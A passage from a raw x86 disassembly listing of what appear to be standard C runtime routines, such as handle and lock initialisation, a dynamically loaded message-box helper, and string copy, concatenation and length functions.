  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
